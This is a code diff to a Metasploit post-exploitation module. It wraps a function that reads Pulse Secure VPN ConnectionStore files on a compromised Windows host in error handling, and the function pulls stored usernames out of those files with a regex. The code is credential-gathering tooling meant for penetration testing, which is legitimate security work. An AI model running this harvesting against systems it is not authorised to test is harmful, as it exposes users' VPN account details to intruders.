@@ -140,24 +140,27 @@ class MetasploitModule < Msf::Post
   # a connection with IVE `ive_index`, nil if none.
   #
   def get_username(sid, ive_index)
-    if !is_system?
-      return nil
-    end
-
     paths = [
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.dat",
       "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.bak",
     ]
-    paths.each do |path|
-      next unless session.fs.file.exist?(path)
+    begin
+      if !is_system?
+        return nil
+      end
+      paths.each do |path|
+        next unless session.fs.file.exist?(path)
 
-      connstore_data = session.fs.file.open(path).read.to_s
-      matches = connstore_data.scan(/userdata "([a-z0-9]*)" {.*?username: "([^"]*)".*?}/m)
-      matches.each do |m|
-        if m[0] == ive_index
-          return m[1]
+        connstore_data = session.fs.file.open(path).read.to_s
+        matches = connstore_data.scan(/userdata "([a-z0-9]*)" {.*?username: "([^"]*)".*?}/m)
+        matches.each do |m|
+          if m[0] == ive_index
+            return m[1]
+          end
         end
       end
+    rescue Rex::Post::Meterpreter::RequestError => e
+      vprint_error(e.message)
     end
     return nil
   end
